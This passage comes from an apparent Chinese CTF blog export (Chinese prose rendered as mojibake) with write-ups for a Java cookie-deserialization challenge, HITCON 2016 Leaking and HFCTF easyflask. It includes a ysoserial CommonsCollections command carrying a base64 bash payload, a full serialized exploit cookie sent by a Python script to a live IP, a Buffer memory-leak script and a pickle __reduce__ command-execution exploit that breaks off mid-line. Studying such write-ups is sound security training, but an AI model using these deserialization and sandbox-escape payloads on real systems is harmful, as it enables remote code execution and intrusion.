field.set(transformerChain,transformers);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = barr.toByteArray();</span><br><span class="line">        String s = Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(s);</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span></span><br><span class="line">            ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ç”¨ysoserialï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections1 &#x27;bash -c &#123;echo,Y2F0IC9mbGFnID4uL3dlYmFwcHMvUk9PVC9mbGFnLnBocA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27; | base64</span><br></pre></td></tr></table></figure>

<ol>
<li>å¯ä»¥ç›´æ¥åœ¨ç½‘é¡µä¿®æ”¹cookieï¼Œç„¶åè®¿é—®adminä¿æŒç™»å½•çŠ¶æ€ï¼Œå®ç°cookieååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œ</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAACYWFzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHEAfgADeHB2cgARamF2YS5sYW5nLlJ1bnRpbWUAAAAAAAAAAAAAAHhwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AApnZXRSdW50aW1ldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAdAAJZ2V0TWV0aG9kdXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AG3NxAH4AE3VxAH4AGAAAAAJwdXEAfgAYAAAAAHQABmludm9rZXVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ABhzcQB+ABN1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAABdABVYmFzaCAtYyB7ZWNobyxZMkYwSUM5bWJHRm5JRDR1TDNkbFltRndjSE12VWs5UFZDOW1iR0ZuTG5Cb2NBPT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfXQABGV4ZWN1cQB+ABsAAAABcQB+ACBzcQB+AA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAACYmJ4</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>python</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://82.156.2.166:9999/&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;user=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAACYWFzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHEAfgADeHB2cgARamF2YS5sYW5nLlJ1bnRpbWUAAAAAAAAAAAAAAHhwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AApnZXRSdW50aW1ldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAdAAJZ2V0TWV0aG9kdXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AG3NxAH4AE3VxAH4AGAAAAAJwdXEAfgAYAAAAAHQABmludm9rZXVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ABhzcQB+ABN1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAABdABVYmFzaCAtYyB7ZWNobyxZMkYwSUM5bWJHRm5JRDR1TDNkbFltRndjSE12VWs5UFZDOW1iR0ZuTG5Cb2NBPT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfXQABGV4ZWN1cQB+ABsAAAABcQB+ACBzcQB+AA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAACYmJ4&quot;</span>&#125;</span><br><span class="line"><span class="comment"># print(headers)</span></span><br><span class="line">res = requests.get(url+<span class="string">&quot;admin/&quot;</span>, headers)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line">res = requests.get(url=url+<span class="string">&quot;flag.php&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<h4 id="å®¡è®¡ï¼š"><a href="#å®¡è®¡ï¼š" class="headerlink" title="å®¡è®¡ï¼š"></a>å®¡è®¡ï¼š</h4><p>ä¸€å…±åªæœ‰å››ä¸ªç±»<code>Serialize</code>ã€<code>AuthFilter</code>ã€<code>doLogin</code>ã€<code>User</code></p>
<p><code>Serialize</code>å°±æ˜¯å®ç°åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œ<code>User</code>ç±»ä¹Ÿæ²¡å¤šå°‘å†…å®¹ï¼Œè€Œ<code>doLogin</code>å°±æ˜¯ç®€å•çš„ç™»å½•åˆ¤æ–­ï¼Œé‡å®šå‘åˆ°<code>admin/index.jsp</code>æˆ–è€…<code>/index.jsp</code></p>
<p>å®ç°ååºåˆ—åŒ–ä¸»è¦æ˜¯åœ¨<code>AuthFilter</code>ï¼Œåœ¨<code>/admin/</code>ä¸‹å¯¹cookieè¿›è¡Œååºåˆ—åŒ–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /admin/*</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    HttpServletRequest request = (HttpServletRequest)req;</span><br><span class="line">    HttpServletResponse response = (HttpServletResponse)resp;</span><br><span class="line">    Cookie[] cookies = request.getCookies();</span><br><span class="line">    String cookie = <span class="keyword">null</span>;</span><br><span class="line">    User user = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (cookies == <span class="keyword">null</span>) &#123;</span><br><span class="line">        request.setAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;è¯·ç™»é™†&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= cookies.length) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    user = (User)Serialize.deserialize(cookie); <span class="comment">// ååºåˆ—è§¦å‘é“¾å­</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">                    var11.printStackTrace();</span><br><span class="line">                    response.sendRedirect(request.getContextPath() + <span class="string">&quot;/index.jsp&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                 â€¦â€¦</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">               </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><blockquote>
<p>è¿˜æ˜¯å¤ªèœå•¦~</p>
</blockquote>
<p>1.ffufçš„ä½¿ç”¨ã€pythonåŠ«æŒåº“ææƒã€CC6çš„ç®€å•è¿ç”¨</p>
<p>2.æ¸—é€çœŸçš„æ˜¯ç›´æ¥è·Ÿç€hhgçš„åšå®¢å°±å¯ä»¥ç›´æ¥å¾—åˆ°flagäº†ï¼Œä½†æ˜¯ä¸€å¼€å§‹åœ¨è¿æ¥sshä¸Šé¢å› ä¸ºsshkeyæ–‡æ¡£æ²¡æœ‰æ¢è¡Œç¬¦å¡äº†åŠå¤©ï¼Œç„¶åæ‰§è¡Œ<code>        Tiquan.py</code>çš„æ—¶å€™ä¸€å¼€å§‹æœ‰<code>os.system(&quot;/bin/bahs&quot;)</code>ï¼Œä½†æ˜¯å¼„ç€å¼„ç€è¿™ä¸ªè¯­å¥å°±æ²¡äº†ï¼Œå› ä¸ºä¸€å¼€å§‹çœ‹åŸæ¥çš„åšå®¢æœ‰ç‚¹ä¸ç†è§£ï¼Œæ‰€ä»¥ä¹Ÿå¡äº†åŠå¤©ï¼Œæœ€åçœ‹äº†å¦ä¸€ç¯‡åšå®¢æ‰å¾—åˆ°flagï¼Œç„¶åèµ›åæ¢å·å¤ç°çš„æ—¶å€™å‘ç°ï¼Œå¦‚æœä¸­é—´æ²¡å‡ºç°é—®é¢˜çš„çš„è¯ï¼Œç›´æ¥æ‰§è¡Œ<code>Tiquan.py</code>å°±å¯ä»¥äº†ï¼Œå¾ˆéš¾è¿‡</p>
<p>1.javaååºåˆ—åŒ–ï¼Œæ„Ÿè§‰è¿˜æ˜¯å¤ªèœäº†ï¼Œå› ä¸ºæ²¡æœ‰åšè¿‡å¤šå°‘é¢˜ï¼Œæ‰€ä»¥å¯¹cookieä¸Šé¢çš„ååºåˆ—åŒ–ä¸æ•æ„Ÿï¼Œåè€Œä¸€ç›´åœ¨æƒ³æ„é€ payloadä¼ªé€ adminç™»å½•ã€‚ä¸€å¼€å§‹è·Ÿç€payloadå¤ç°çš„æ—¶å€™ä¸€ç›´åœ¨ç”¨ysoserialçš„CC1æ¥æ„é€ ï¼Œæ€»æ˜¯è¿‡ä¸å»ï¼Œåæ¥çªç„¶æ‰æƒ³åˆ°ä¼šä¸ä¼šæ˜¯jdkç‰ˆæœ¬çš„åŸå› ï¼Œåº”è¯¥è¦æƒ³åˆ°çš„ï¼Œå¾—å¤šåšç‚¹é¢˜ï¼ˆï¼ˆï¼ˆï¼ˆ</p>
]]></content>
      <categories>
        <category>å‚åŠ çš„å„ç§æ¯”èµ›</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>hznuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>é›†è®­ç¬¬ä¸‰å‘¨å­¦ä¹ </title>
    <url>/2022/02/12/%E9%9B%86%E8%AE%AD%E7%AC%AC%E4%B8%89%E5%91%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="HITCON-2016-Leaking"><a href="#HITCON-2016-Leaking" class="headerlink" title="[HITCON 2016]Leaking"></a>[HITCON 2016]Leaking</h4><ul>
<li>nodejs</li>
</ul>
<p>åœ¨è¾ƒæ—©ä¸€ç‚¹çš„ node ç‰ˆæœ¬ä¸­ (8.0 ä¹‹å‰)ï¼Œå½“ Buffer çš„æ„é€ å‡½æ•°ä¼ å…¥æ•°å­—æ—¶, ä¼šå¾—åˆ°ä¸æ•°å­—é•¿åº¦ä¸€è‡´çš„ä¸€ä¸ª Bufferï¼Œå¹¶ä¸”è¿™ä¸ª Buffer æ˜¯æœªæ¸…é›¶çš„ã€‚8.0 ä¹‹åçš„ç‰ˆæœ¬å¯ä»¥é€šè¿‡å¦ä¸€ä¸ªå‡½æ•° Buffer.allocUnsafe(size) æ¥è·å¾—æœªæ¸…ç©ºçš„å†…å­˜ã€‚</p>
<p>ä¹Ÿå°±æ˜¯å¯ä»¥åˆ©ç”¨Buffer()æ¥è¯»å–å†…å­˜</p>
<hr>
<span id="more"></span>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> randomstring = <span class="built_in">require</span>(<span class="string">&quot;randomstring&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> &#123;</span><br><span class="line">    VM</span><br><span class="line">&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> flag = <span class="built_in">require</span>(<span class="string">&quot;./config.js&quot;</span>).flag</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */</span></span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;var flag_&quot;</span> + randomstring.generate(<span class="number">64</span>) + <span class="string">&quot; = \&quot;hitcon&#123;&quot;</span> + flag + <span class="string">&quot;&#125;\&quot;;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (req.query.data &amp;&amp; req.query.data.length &lt;= <span class="number">12</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> vm = <span class="keyword">new</span> VM(&#123;</span><br><span class="line">            <span class="attr">timeout</span>: <span class="number">1000</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">console</span>.log(req.query.data);</span><br><span class="line">        res.send(<span class="string">&quot;eval -&gt;&quot;</span> + vm.run(req.query.data));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(fs.readFileSync(__filename).toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;listening on port 3000!&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å®¡è®¡æºç å¯ä»¥çŸ¥é“å®šä¹‰å’Œflagï¼Œä½†æ˜¯flagå˜é‡åå­—æœªçŸ¥ï¼Œä½†æ˜¯<code>res.send(&quot;eval -&gt;&quot; + vm.run(req.query.data));</code>ä½¿å¾—æˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç </p>
<p>ä¸è¿‡ç”±äºæ²¡æ€ä¹ˆåšè¿‡nodejsç±»å‹çš„é¢˜ç›®ï¼Œæ‰€ä»¥çœ‹äº†åˆ«çš„å¸ˆå‚…çš„wp</p>
<p>å¯ä»¥çŸ¥é“è¿™é‡Œåˆ©ç”¨nodejsæ²™ç®±é€ƒé€¸è¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œ</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://32ae46a5-a44c-452f-bf07-0b157261450b.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;?data=Buffer(500)&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url+payload)</span><br><span class="line"><span class="keyword">while</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    r = requests.get(url + payload)</span><br><span class="line">    <span class="built_in">print</span>(r.status_code)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h4 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h4><ul>
<li>sessionä¼ªé€ </li>
<li>pythonåºåˆ—åŒ– <code>__reduce__</code></li>
</ul>
<p><code>Pickle</code>çš„<code>dumps</code>å’Œ<code>loads</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    name: <span class="string">&quot;admin&quot;</span></span><br><span class="line">    is_admin: <span class="number">0</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(_pickle.dumps(User()))</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(_pickle.dumps(User())))</span><br><span class="line">usr = _pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(_pickle.loads(usr))</span><br></pre></td></tr></table></figure>

<p><code>__reduce__</code>:</p>
<p>åœ¨ç”¨pickleçš„æ—¶å€™å°†è¯¥è¿”å›å€¼è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼ˆæˆ–è®¸æ˜¯è¿™æ ·ï¼Œå¯èƒ½ä¹‹åä¼šè¿›è¡Œä¿®æ”¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    name: <span class="string">&quot;admin&quot;</span></span><br><span class="line">    is_admin: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ä½ è¿›è¡Œäº†ååºåˆ—åŒ–&quot;</span>)</span><br><span class="line">        os.system(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(_pickle.dumps(User()))</span><br><span class="line">    <span class="built_in">print</span>(base64.b64encode(_pickle.dumps(User())))</span><br><span class="line">    usr = _pickle.dumps(User())</span><br><span class="line">    <span class="built_in">print</span>(_pickle.loads(usr))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>) </span><br></pre></td></tr></table></figure>

<hr>
<p>è·å–åˆ°æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_handler</span>():</span></span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_handler</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.ç†Ÿæ‚‰çš„<code>secret_key</code> åŠ ä¸Šflaskæ¡†æ¶ç›´æ¥ç”¨ä»¥å‰çš„è„šæœ¬è¿›è¡Œsessionä¼ªé€ å°±å¥½äº†</p>
<p>2.å®šä¹‰äº†ä¸€ä¸ª<code>User</code>ç±»ï¼Œå¯çŸ¥æˆ‘ä»¬è¦ä¼ªé€ çš„å†…å®¹ä¸º<code>uname:admin is_admin:1</code></p>
<p>3.åˆ©ç”¨pythonçš„pickleçš„dumpså’Œloadsè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–</p>
<p>æ‰€ä»¥å¯ä»¥åˆ©ç”¨<code>__reduce__</code>æ–¹æ³•è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<p>expï¼šï¼ˆæœ€å¥½åœ¨linux python2ç¯å¢ƒ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (os.system,(<span class="string">&quot;bash -c 